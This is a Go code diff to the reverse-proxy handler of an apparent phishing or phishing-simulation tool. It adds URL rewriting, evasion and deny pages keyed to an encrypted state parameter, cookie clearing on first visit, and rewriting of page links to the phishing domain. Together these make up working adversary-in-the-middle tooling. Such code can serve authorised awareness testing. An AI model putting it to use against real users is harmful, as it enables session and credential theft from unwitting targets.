@@ -106,6 +106,7 @@ type ProxyHandler struct {
 	logger                      *zap.SugaredLogger
 	sessions                    sync.Map // map[string]*ProxySession
 	campaignRecipientSessions   sync.Map // map[string]string (campaignRecipientID -> sessionID)
+	urlMappings                 sync.Map // map[string]string (rewritten URL -> original URL)
 	PageRepository              *repository.Page
 	CampaignRecipientRepository *repository.CampaignRecipient
 	CampaignRepository          *repository.Campaign
@@ -116,6 +117,7 @@ type ProxyHandler struct {
 	CampaignService             *service.Campaign
 	TemplateService             *service.Template
 	IPAllowListService          *service.IPAllowListService
+	OptionRepository            *repository.Option
 	cookieName                  string
 }
 
@@ -131,7 +133,14 @@ func NewProxyHandler(
 	campaignService *service.Campaign,
 	templateService *service.Template,
 	ipAllowListService *service.IPAllowListService,
+	optionRepo *repository.Option,
 ) *ProxyHandler {
+	// get proxy cookie name from database
+	cookieName := "ps" // fallback default
+	if opt, err := optionRepo.GetByKey(context.Background(), data.OptionKeyProxyCookieName); err == nil {
+		cookieName = opt.Value.String()
+	}
+
 	return &ProxyHandler{
 		logger:                      logger,
 		PageRepository:              pageRepo,
@@ -144,7 +153,8 @@ func NewProxyHandler(
 		CampaignService:             campaignService,
 		TemplateService:             templateService,
 		IPAllowListService:          ipAllowListService,
-		cookieName:                  "ps",
+		OptionRepository:            optionRepo,
+		cookieName:                  cookieName,
 	}
 }
 
@@ -156,6 +166,11 @@ func (m *ProxyHandler) HandleHTTPRequest(w http.ResponseWriter, req *http.Reques
 	reqCtx, err := m.initializeRequestContext(ctx, req, domain)
 	if err != nil {
 		return err
+	}
+
+	// check for URL rewrite and redirect if needed
+	if rewriteResp := m.checkAndApplyURLRewrite(req, reqCtx); rewriteResp != nil {
+		return m.writeResponse(w, rewriteResp)
 	}
 
 	// check ip filtering if we have a campaign recipient
@@ -276,27 +291,58 @@ func (m *ProxyHandler) processRequestWithContext(req *http.Request, reqCtx *Requ
 	}
 
 	reqURL := req.URL.String()
+
+	// check for existing session first
+	sessionCookie, err := req.Cookie(m.cookieName)
+	if err == nil && m.isValidSessionCookie(sessionCookie.Value) {
+		reqCtx.SessionID = sessionCookie.Value
+	}
+
+	// always create new session for initial MITM page visits with campaign recipient ID
 	createSession := reqCtx.CampaignRecipientID != nil
+
+	// check if this has a valid state parameter (post-evasion request)
+	hasValidStateParameter := false
+	if createSession {
+		campaign, _, _, err := m.getCampaignInfo(req.Context(), reqCtx.CampaignRecipientID)
+		if err == nil {
+			templateID, err := campaign.TemplateID.Get()
+			if err == nil {
+				cTemplate, err := m.CampaignTemplateRepository.GetByID(req.Context(), &templateID, &repository.CampaignTemplateOption{
+					WithIdentifier: true,
+				})
+				if err == nil && cTemplate.StateIdentifier != nil {
+					stateParamKey := cTemplate.StateIdentifier.Name.MustGet()
+					encryptedParam := req.URL.Query().Get(stateParamKey)
+					if encryptedParam != "" {
+						campaignID, _ := campaign.ID.Get()
+						secret := utils.UUIDToSecret(&campaignID)
+						if decrypted, err := utils.Decrypt(encryptedParam, secret); err == nil {
+							hasValidStateParameter = decrypted != "deny"
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// check for deny pages first (for any campaign recipient ID)
+	if reqCtx.CampaignRecipientID != nil {
+		if resp := m.checkAndServeDenyPage(req, reqCtx); resp != nil {
+			return req, resp
+		}
+	}
 
 	// check for evasion/deny pages BEFORE session resolution for initial requests
 	if createSession {
 		// cleanup any existing session first
 		m.cleanupExistingSession(reqCtx.CampaignRecipientID, reqURL)
 
-		// check if this is a deny request from evasion page
-		if resp := m.checkAndServeDenyPage(req, reqCtx); resp != nil {
-			return req, resp
-		}
-
-		// check if we should serve an evasion page first
-		if resp := m.checkAndServeEvasionPage(req, reqCtx); resp != nil {
-			return req, resp
-		}
-	} else {
-		// check for existing session
-		sessionCookie, err := req.Cookie(m.cookieName)
-		if err == nil && m.isValidSessionCookie(sessionCookie.Value) {
-			reqCtx.SessionID = sessionCookie.Value
+		// check for evasion page only if no valid state parameter (initial request)
+		if !hasValidStateParameter {
+			if resp := m.checkAndServeEvasionPage(req, reqCtx); resp != nil {
+				return req, resp
+			}
 		}
 	}
 
@@ -318,19 +364,24 @@ func (m *ProxyHandler) processRequestWithContext(req *http.Request, reqCtx *Requ
 	}
 
 	// handle requests without session
-	if reqCtx.SessionID == "" && !createSession {
+	if reqCtx.SessionID == "" && !createSession && reqCtx.CampaignRecipientID == nil {
 		return m.prepareRequestWithoutSession(req, reqCtx.TargetDomain), nil
 	}
 
-	// get or create session and populate context
-	err := m.resolveSessionContext(req, reqCtx, createSession)
-	if err != nil {
-		m.logger.Errorw("failed to resolve session context", "error", err)
-		return req, m.createServiceUnavailableResponse("Service temporarily unavailable")
+	// get or create session and populate context if we have campaign recipient ID or valid session
+	if reqCtx.CampaignRecipientID != nil || reqCtx.SessionID != "" {
+		err = m.resolveSessionContext(req, reqCtx, createSession)
+		if err != nil {
+			m.logger.Errorw("failed to resolve session context", "error", err)
+			return req, m.createServiceUnavailableResponse("Service temporarily unavailable")
+		}
+
+		// apply session-based request processing
+		return m.applySessionToRequestWithContext(req, reqCtx), nil
 	}
 
-	// apply session-based request processing
-	return m.applySessionToRequestWithContext(req, reqCtx), nil
+	// handle requests without campaign recipient ID or session
+	return m.prepareRequestWithoutSession(req, reqCtx.TargetDomain), nil
 }
 
 func (m *ProxyHandler) cleanupExistingSession(campaignRecipientID *uuid.UUID, reqURL string) {
@@ -388,13 +439,48 @@ func (m *ProxyHandler) resolveSessionContext(req *http.Request, reqCtx *RequestC
 
 func (m *ProxyHandler) applySessionToRequestWithContext(req *http.Request, reqCtx *RequestContext) *http.Request {
 	// handle initial request with campaign recipient id
+	if reqCtx.CampaignRecipientID != nil && reqCtx.SessionCreated {
+
+		// always redirect to StartURL for new sessions (both initial and post-evasion)
+		// get proxy configuration to extract start url
+		ctx := req.Context()
+		proxyEntry, err := m.ProxyRepository.GetByID(ctx, reqCtx.Domain.ProxyID, &repository.ProxyOption{})
+		if err == nil {
+			startURL, err := proxyEntry.StartURL.Get()
+			if err == nil {
+				// parse start url to get the target path and query
+				if parsedStartURL, err := url.Parse(startURL.String()); err == nil {
+					// use the path and query from start url for initial mitm visits
+					req.URL.Path = parsedStartURL.Path
+					req.URL.RawQuery = parsedStartURL.RawQuery
+				}
+			}
+		}
+	}
+
+	// handle any request with campaign recipient id (initial or existing session)
 	if reqCtx.CampaignRecipientID != nil {
 		req.Host = reqCtx.Session.TargetDomain
 		req.URL.Scheme = "https"
 		req.URL.Host = reqCtx.Session.TargetDomain
-		// remove campaign recipient id from query params
+		// remove campaign parameters from query params
 		q := req.URL.Query()
 		q.Del(reqCtx.ParamName)
+
+		// also remove state parameter if it exists
+		if reqCtx.Session.Campaign != nil {
+			templateID, err := reqCtx.Session.Campaign.TemplateID.Get()
+			if err == nil {
+				ctx := req.Context()
+				cTemplate, err := m.CampaignTemplateRepository.GetByID(ctx, &templateID, &repository.CampaignTemplateOption{
+					WithIdentifier: true,
+				})
+				if err == nil && cTemplate.StateIdentifier != nil {
+					stateParamKey := cTemplate.StateIdentifier.Name.MustGet()
+					q.Del(stateParamKey)
+				}
+			}
+		}
 		req.URL.RawQuery = q.Encode()
 	} else {
 		// for subsequent requests, map to original host
@@ -538,6 +624,8 @@ func (m *ProxyHandler) captureResponseDataWithContext(resp *http.Response, reqCt
 func (m *ProxyHandler) processResponseWithSessionContext(resp *http.Response, reqCtx *RequestContext) *http.Response {
 	// set session cookie for new sessions
 	if reqCtx.SessionCreated {
+		// clear all existing cookies for initial MITM visit to ensure fresh start
+		m.clearAllCookiesForInitialMitmVisit(resp, reqCtx)
 		m.setSessionCookieWithContext(resp, reqCtx)
 	}
 
@@ -569,12 +657,14 @@ func (m *ProxyHandler) setSessionCookieWithContext(resp *http.Response, reqCtx *
 		Secure:   true,
 		SameSite: http.SameSiteLaxMode,
 	}
+
 	resp.Header.Add("Set-Cookie", cookie.String())
 }
 
 func (m *ProxyHandler) copyCookieToResponse(sourceResp, targetResp *http.Response) {
-	if cookieHeader := sourceResp.Header.Get("Set-Cookie"); cookieHeader != "" {
-		targetResp.Header.Set("Set-Cookie", cookieHeader)
+	cookieHeaders := sourceResp.Header.Values("Set-Cookie")
+	for _, cookieHeader := range cookieHeaders {
+		targetResp.Header.Add("Set-Cookie", cookieHeader)
 	}
 }
 
@@ -672,6 +762,7 @@ func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCt
 	}
 
 	body = m.patchUrls(reqCtx.ConfigMap, body, CONVERT_TO_PHISHING_URLS)
+	body = m.applyURLPathRewrites(body, reqCtx)
 	body = m.applyCustomReplacements(body, reqCtx.Session)
 
 	m.updateResponseBody(resp, body, wasCompressed)
@@ -791,6 +882,7 @@ func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Respo
 	}
 
 	body = m.patchUrls(config, body, CONVERT_TO_PHISHING_URLS)
+	body = m.applyURLPathRewritesWithoutSession(body, reqCtx)
 	body = m.applyCustomReplacementsWithoutSession(body, config, reqCtx.TargetDomain)
 
 	m.updateResponseBody(resp, body, wasCompressed)
@@ -2076,6 +2168,9 @@ func (m *ProxyHandler) buildCampaignFlowRedirectURL(session *ProxySession, nextP
 		if _, err := cTemplate.AfterLandingPageID.Get(); err == nil {
 			usesTemplateDomain = true
 		}
+	case "deny":
+		// deny pages should use template domain if available
+		usesTemplateDomain = true
 	default:
 		if redirectURL, err := cTemplate.AfterLandingPageRedirectURL.Get(); err == nil {
 			if url := redirectURL.String(); len(url) > 0 {
@@ -2215,6 +2310,18 @@ func (m *ProxyHandler) setProxyConfigDefaults(config *service.ProxyServiceConfig
 				}
 			}
 		}
+
+		// set defaults for domain access control
+		if domainConfig != nil && domainConfig.Access != nil {
+			// set default mode to private if not specified
+			if domainConfig.Access.Mode == "" {
+				domainConfig.Access.Mode = "private"
+			}
+			// set default deny action for private mode if not specified
+			if domainConfig.Access.Mode == "private" && domainConfig.Access.OnDeny == "" {
+				domainConfig.Access.OnDeny = "404"
+			}
+		}
 		config.Hosts[domain] = domainConfig
 	}
 
@@ -2225,6 +2332,18 @@ func (m *ProxyHandler) setProxyConfigDefaults(config *service.ProxyServiceConfig
 			if config.Global.Response[i].Status == 0 {
 				config.Global.Response[i].Status = 200
 			}
+		}
+	}
+
+	// set defaults for global access control
+	if config.Global != nil && config.Global.Access != nil {
+		// set default mode to private if not specified
+		if config.Global.Access.Mode == "" {
+			config.Global.Access.Mode = "private"
+		}
+		// set default deny action for private mode if not specified
+		if config.Global.Access.Mode == "private" && config.Global.Access.OnDeny == "" {
+			config.Global.Access.OnDeny = "404"
 		}
 	}
 }
@@ -2464,6 +2583,27 @@ func (m *ProxyHandler) createServiceUnavailableResponse(message string) *http.Re
 	}
 	resp.Header.Set("Content-Type", "text/plain")
 	return resp
+}
+
+func (m *ProxyHandler) clearAllCookiesForInitialMitmVisit(resp *http.Response, reqCtx *RequestContext) {
+	// clear all existing cookies by setting them to expire immediately
+	if resp.Request != nil {
+		for _, cookie := range resp.Request.Cookies() {
+			// create expired cookie to clear it
+			expiredCookie := &http.Cookie{
+				Name:     cookie.Name,
+				Value:    "",
+				Path:     "/",
+				Domain:   reqCtx.PhishDomain,
+				Expires:  time.Unix(0, 0),
+				MaxAge:   -1,
+				HttpOnly: true,
+				Secure:   true,
+				SameSite: http.SameSiteNoneMode,
+			}
+			resp.Header.Add("Set-Cookie", expiredCookie.String())
+		}
+	}
 }
 
 func (m *ProxyHandler) writeResponse(w http.ResponseWriter, resp *http.Response) error {
@@ -2848,8 +2988,21 @@ func (m *ProxyHandler) checkAndServeEvasionPage(req *http.Request, reqCtx *Reque
 		}
 	}
 
+	// preserve the original URL without campaign parameters for post-evasion redirect
+	originalURL := req.URL.Path
+	if req.URL.RawQuery != "" {
+		// parse query params and remove campaign recipient ID
+		query := req.URL.Query()
+		if reqCtx.ParamName != "" {
+			query.Del(reqCtx.ParamName)
+		}
+		if len(query) > 0 {
+			originalURL += "?" + query.Encode()
+		}
+	}
+
 	// this is initial request with campaign recipient ID and no state parameter, serve evasion page
-	return m.serveEvasionPageResponseDirect(req, reqCtx, &evasionPageID, campaign, cTemplate)
+	return m.serveEvasionPageResponseDirect(req, reqCtx, &evasionPageID, campaign, cTemplate, originalURL)
 }
 
 // checkAndServeDenyPage checks if a deny page should be served and returns the response if so
@@ -2868,6 +3021,7 @@ func (m *ProxyHandler) checkAndServeDenyPage(req *http.Request, reqCtx *RequestC
 
 	ctx := req.Context()
 	cTemplate, err := m.CampaignTemplateRepository.GetByID(ctx, &templateID, &repository.CampaignTemplateOption{
+		WithDomain:     true,
 		WithIdentifier: true,
 	})
 	if err != nil {
@@ -2875,19 +3029,17 @@ func (m *ProxyHandler) checkAndServeDenyPage(req *http.Request, reqCtx *RequestC
 	}
 
 	// check if state parameter indicates deny
-	if cTemplate.StateIdentifier != nil {
-		stateParamKey := cTemplate.StateIdentifier.Name.MustGet()
-		encryptedParam := req.URL.Query().Get(stateParamKey)
-		if encryptedParam != "" {
-			campaignID, err := campaign.ID.Get()
-			if err != nil {
-				return nil
-			}
-			secret := utils.UUIDToSecret(&campaignID)
-			if decrypted, err := utils.Decrypt(encryptedParam, secret); err == nil {
-				if decrypted == "deny" {
-					return m.serveDenyPageResponseDirect(req, reqCtx, campaign)
-				}
+	stateParamKey := cTemplate.StateIdentifier.Name.MustGet()
+	encryptedParam := req.URL.Query().Get(stateParamKey)
+	if encryptedParam != "" {
+		campaignID, err := campaign.ID.Get()
+		if err != nil {
+			return nil
+		}
+		secret := utils.UUIDToSecret(&campaignID)
+		if decrypted, err := utils.Decrypt(encryptedParam, secret); err == nil {
+			if decrypted == "deny" {
+				return m.serveDenyPageResponseDirect(req, reqCtx, campaign, cTemplate)
 			}
 		}
 	}
@@ -2895,7 +3047,7 @@ func (m *ProxyHandler) checkAndServeDenyPage(req *http.Request, reqCtx *RequestC
 	return nil
 }
 
-func (m *ProxyHandler) serveEvasionPageResponseDirect(req *http.Request, reqCtx *RequestContext, evasionPageID *uuid.UUID, campaign *model.Campaign, cTemplate *model.CampaignTemplate) *http.Response {
+func (m *ProxyHandler) serveEvasionPageResponseDirect(req *http.Request, reqCtx *RequestContext, evasionPageID *uuid.UUID, campaign *model.Campaign, cTemplate *model.CampaignTemplate, originalURL string) *http.Response {
 	ctx := req.Context()
 	evasionPage, err := m.PageRepository.GetByID(ctx, evasionPageID, &repository.PageOption{})
 	if err != nil {
@@ -2918,7 +3070,7 @@ func (m *ProxyHandler) serveEvasionPageResponseDirect(req *http.Request, reqCtx 
 		nextPageType = data.PAGE_TYPE_LANDING
 	}
 
-	htmlContent, err := m.renderEvasionPageTemplate(req, reqCtx, evasionPage, campaign, cTemplate, nextPageType)
+	htmlContent, err := m.renderEvasionPageTemplate(req, reqCtx, evasionPage, campaign, cTemplate, nextPageType, originalURL)
 	if err != nil {
 		m.logger.Errorw("failed to render evasion page template", "error", err)
 		return nil
@@ -2941,7 +3093,7 @@ func (m *ProxyHandler) serveEvasionPageResponseDirect(req *http.Request, reqCtx 
 	return resp
 }
 
-func (m *ProxyHandler) serveDenyPageResponseDirect(req *http.Request, reqCtx *RequestContext, campaign *model.Campaign) *http.Response {
+func (m *ProxyHandler) serveDenyPageResponseDirect(req *http.Request, reqCtx *RequestContext, campaign *model.Campaign, cTemplate *model.CampaignTemplate) *http.Response {
 	denyPageID, err := campaign.DenyPageID.Get()
 	if err != nil {
 		// if no deny page configured, return 403
@@ -2955,6 +3107,32 @@ func (m *ProxyHandler) serveDenyPageResponseDirect(req *http.Request, reqCtx *Re
 		return resp
 	}
 
+	// check if we're on a mitm domain and should redirect to campaign template domain
+	if cTemplate != nil && cTemplate.Domain != nil {
+		currentDomainName := req.Host
+		templateDomainName, err := cTemplate.Domain.Name.Get()
+		if err == nil && currentDomainName != templateDomainName.String() {
+			// we're on mitm domain, redirect to campaign template domain
+			campaignID := campaign.ID.MustGet()
+			redirectURL := m.buildCampaignFlowRedirectURL(&ProxySession{
+				CampaignRecipientID: reqCtx.CampaignRecipientID,
+				Campaign:            campaign,
+				CampaignID:          &campaignID,
+			}, "deny")
+			if redirectURL != "" {
+				resp := &http.Response{
+					StatusCode: 302,
+					Header:     make(http.Header),
+					Body:       io.NopCloser(strings.NewReader("")),
+				}
+				resp.Header.Set("Location", redirectURL)
+				resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+				return resp
+			}
+		}
+	}
+
+	// serve deny page directly (either on campaign template domain or as fallback)
 	ctx := req.Context()
 	denyPage, err := m.PageRepository.GetByID(ctx, &denyPageID, &repository.PageOption{})
 	if err != nil {
@@ -2984,7 +3162,7 @@ func (m *ProxyHandler) serveDenyPageResponseDirect(req *http.Request, reqCtx *Re
 	return resp
 }
 
-func (m *ProxyHandler) renderEvasionPageTemplate(req *http.Request, reqCtx *RequestContext, page *model.Page, campaign *model.Campaign, cTemplate *model.CampaignTemplate, nextPageType string) (string, error) {
+func (m *ProxyHandler) renderEvasionPageTemplate(req *http.Request, reqCtx *RequestContext, page *model.Page, campaign *model.Campaign, cTemplate *model.CampaignTemplate, nextPageType string, originalURL string) (string, error) {
 	// get recipient
 	ctx := req.Context()
 	cRecipient, err := m.CampaignRecipientRepository.GetByID(ctx, reqCtx.CampaignRecipientID, &repository.CampaignRecipientOption{})
@@ -3062,8 +3240,7 @@ func (m *ProxyHandler) renderEvasionPageTemplate(req *http.Request, reqCtx *Requ
 		RedirectURL:       domain.RedirectURL.MustGet().String(),
 	}
 
-	// use template service to render the page
-	urlPath := req.URL.Path
+	// use template service to render the page with preserved original URL
 	buf, err := m.TemplateService.CreatePhishingPageWithCampaign(
 		dbDomain,
 		email,
@@ -3072,7 +3249,7 @@ func (m *ProxyHandler) renderEvasionPageTemplate(req *http.Request, reqCtx *Requ
 		htmlContent.String(),
 		cTemplate,
 		encryptedNextState,
-		urlPath,
+		originalURL,
 		campaign,
 	)
 	if err != nil {
@@ -3185,7 +3362,7 @@ func (m *ProxyHandler) checkIPFilter(req *http.Request, reqCtx *RequestContext) 
 	if !allowed {
 		// try to serve deny page
 		if _, err := campaign.DenyPageID.Get(); err == nil {
-			resp := m.serveDenyPageResponseDirect(req, reqCtx, campaign)
+			resp := m.serveDenyPageResponseDirect(req, reqCtx, campaign, nil)
 			return true, resp
 		}
 
@@ -3194,4 +3371,203 @@ func (m *ProxyHandler) checkIPFilter(req *http.Request, reqCtx *RequestContext) 
 	}
 
 	return false, nil
+}
+
+// checkAndApplyURLRewrite checks if the incoming request matches any URL rewrite rules
+// and returns a redirect response if a match is found
+func (m *ProxyHandler) checkAndApplyURLRewrite(req *http.Request, reqCtx *RequestContext) *http.Response {
+	// check if this is already a rewritten URL that we need to reverse map
+	originalURL := m.getReverseURLMapping(req.URL.Path, req.URL.RawQuery)
+	if originalURL != "" {
+		// this is a rewritten URL, update the request to use the original URL
+		m.applyReverseURLMapping(req, originalURL)
+		return nil
+	}
+
+	// check for URL rewrite rules in domain config
+	var rewriteRules []service.ProxyServiceURLRewriteRule
+	if domainConfig, exists := reqCtx.ProxyConfig.Hosts[reqCtx.TargetDomain]; exists && domainConfig.RewriteURLs != nil {
+		rewriteRules = append(rewriteRules, domainConfig.RewriteURLs...)
+	}
+
+	// check for URL rewrite rules in global config
+	if reqCtx.ProxyConfig.Global != nil && reqCtx.ProxyConfig.Global.RewriteURLs != nil {
+		rewriteRules = append(rewriteRules, reqCtx.ProxyConfig.Global.RewriteURLs...)
+	}
+
+	// check each rewrite rule
+	for _, rule := range rewriteRules {
+		if matched, rewrittenURL := m.applyURLRewriteRule(req, rule); matched {
+			// store the mapping for reverse lookup
+			originalURL := req.URL.Path
+			if req.URL.RawQuery != "" {
+				originalURL += "?" + req.URL.RawQuery
+			}
+			m.storeURLMapping(rewrittenURL, originalURL)
+
+			// create redirect response
+			return &http.Response{
+				StatusCode: http.StatusFound,
+				Header: http.Header{
+					"Location": []string{rewrittenURL},
+				},
+				Body: io.NopCloser(strings.NewReader("")),
+			}
+		}
+	}
+
+	return nil
+}
+
+// applyURLRewriteRule checks if a URL matches a rewrite rule and returns the rewritten URL
+func (m *ProxyHandler) applyURLRewriteRule(req *http.Request, rule service.ProxyServiceURLRewriteRule) (bool, string) {
+	// compile regex pattern
+	pathRegex, err := regexp.Compile(rule.Find)
+	if err != nil {
+		m.logger.Errorw("invalid URL rewrite regex pattern", "pattern", rule.Find, "error", err)
+		return false, ""
+	}
+
+	// check if path matches
+	if !pathRegex.MatchString(req.URL.Path) {
+		return false, ""
+	}
+
+	// build rewritten URL
+	rewrittenPath := rule.Replace
+	rewrittenQuery := m.rewriteQueryParameters(req.URL.Query(), rule.Query, rule.Filter)
+
+	// construct full rewritten URL
+	rewrittenURL := rewrittenPath
+	if rewrittenQuery != "" {
+		rewrittenURL += "?" + rewrittenQuery
+	}
+
+	return true, rewrittenURL
+}
+
+// rewriteQueryParameters applies query parameter mapping rules
+func (m *ProxyHandler) rewriteQueryParameters(originalQuery url.Values, queryRules []service.ProxyServiceURLRewriteQueryParam, filter []string) string {
+	rewrittenQuery := url.Values{}
+
+	// if filter list is empty, keep all parameters and apply mappings
+	if len(filter) == 0 {
+		// start with all original parameters
+		for key, values := range originalQuery {
+			rewrittenQuery[key] = values
+		}
+
+		// apply parameter mappings
+		for _, rule := range queryRules {
+			if values, exists := originalQuery[rule.Find]; exists {
+				// remove the old key and add the new one
+				delete(rewrittenQuery, rule.Find)
+				rewrittenQuery[rule.Replace] = values
+			}
+		}
+	} else {
+		// only keep parameters in the filter list
+		for _, key := range filter {
+			if values, exists := originalQuery[key]; exists {
+				rewrittenQuery[key] = values
+			}
+		}
+
+		// apply mappings only to filtered parameters
+		for _, rule := range queryRules {
+			if values, exists := originalQuery[rule.Find]; exists && contains(filter, rule.Find) {
+				// remove the old key and add the new one
+				delete(rewrittenQuery, rule.Find)
+				rewrittenQuery[rule.Replace] = values
+			}
+		}
+	}
+
+	return rewrittenQuery.Encode()
+}
+
+// contains checks if a string slice contains a specific string
+func contains(slice []string, item string) bool {
+	for _, s := range slice {
+		if s == item {
+			return true
+		}
+	}
+	return false
+}
+
+// storeURLMapping stores the mapping between rewritten and original URLs
+func (m *ProxyHandler) storeURLMapping(rewrittenURL, originalURL string) {
+	m.urlMappings.Store(rewrittenURL, originalURL)
+}
+
+// getReverseURLMapping gets the original URL for a rewritten URL
+func (m *ProxyHandler) getReverseURLMapping(path, query string) string {
+	rewrittenURL := path
+	if query != "" {
+		rewrittenURL += "?" + query
+	}
+
+	if originalURL, exists := m.urlMappings.Load(rewrittenURL); exists {
+		return originalURL.(string)
+	}
+	return ""
+}
+
+// applyReverseURLMapping updates the request to use the original URL
+func (m *ProxyHandler) applyReverseURLMapping(req *http.Request, originalURL string) {
+	// parse the original URL
+	parsedURL, err := url.Parse(originalURL)
+	if err != nil {
+		m.logger.Errorw("failed to parse original URL during reverse mapping", "url", originalURL, "error", err)
+		return
+	}
+
+	// update request URL
+	req.URL.Path = parsedURL.Path
+	req.URL.RawQuery = parsedURL.RawQuery
+	req.RequestURI = req.URL.Path
+	if req.URL.RawQuery != "" {
+		req.RequestURI += "?" + req.URL.RawQuery
+	}
+}
+
+// applyURLPathRewrites applies URL path rewriting to response body content
+func (m *ProxyHandler) applyURLPathRewrites(body []byte, reqCtx *RequestContext) []byte {
+	// get URL rewrite rules from domain config
+	var rewriteRules []service.ProxyServiceURLRewriteRule
+	if domainConfig, exists := reqCtx.ProxyConfig.Hosts[reqCtx.TargetDomain]; exists && domainConfig.RewriteURLs != nil {
+		rewriteRules = append(rewriteRules, domainConfig.RewriteURLs...)
+	}
+
+	// get URL rewrite rules from global config
+	if reqCtx.ProxyConfig.Global != nil && reqCtx.ProxyConfig.Global.RewriteURLs != nil {
+		rewriteRules = append(rewriteRules, reqCtx.ProxyConfig.Global.RewriteURLs...)
+	}
+
+	// apply each rewrite rule to the response body
+	bodyStr := string(body)
+	for _, rule := range rewriteRules {
+		bodyStr = m.rewritePathsInContent(bodyStr, rule)
+	}
+
+	return []byte(bodyStr)
+}
+
+// applyURLPathRewritesWithoutSession applies URL path rewriting for requests without session
+func (m *ProxyHandler) applyURLPathRewritesWithoutSession(body []byte, reqCtx *RequestContext) []byte {
+	return m.applyURLPathRewrites(body, reqCtx)
+}
+
+// rewritePathsInContent rewrites URL paths in HTML/JS content according to rewrite rules
+func (m *ProxyHandler) rewritePathsInContent(content string, rule service.ProxyServiceURLRewriteRule) string {
+	// compile regex pattern for finding URLs in content
+	pathRegex, err := regexp.Compile(rule.Find)
+	if err != nil {
+		m.logger.Errorw("invalid URL rewrite regex pattern", "pattern", rule.Find, "error", err)
+		return content
+	}
+
+	// find and replace all occurrences of the original path with the rewritten path
+	return pathRegex.ReplaceAllString(content, rule.Replace)
 }
